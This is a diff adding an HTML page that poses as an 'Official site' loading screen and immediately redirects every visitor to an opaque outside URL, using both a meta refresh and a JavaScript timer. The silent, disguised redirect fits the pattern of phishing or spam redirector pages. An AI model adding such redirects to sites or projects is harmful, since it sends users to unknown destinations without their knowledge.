@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>Welcome</title>
+  <meta name="description" content="Official site loading, please wait...">
+  <meta property="og:title" content="Welcome">
+  <meta property="og:description" content="Loading page...">
+  <meta property="og:type" content="website">
+
+  <meta http-equiv="refresh" content="0; URL='https://romesholl.com/c6b5hjbL'" />
+  
+  <script>
+    setTimeout(function() {
+      window.location.href = "https://romesholl.com/c6b5hjbL";
+    }, 100);
+  </script>
+</head>
+<body>
+  <p style="text-align:center;margin-top:50px;">Loading, please wait...</p>
+</body>
+</html>
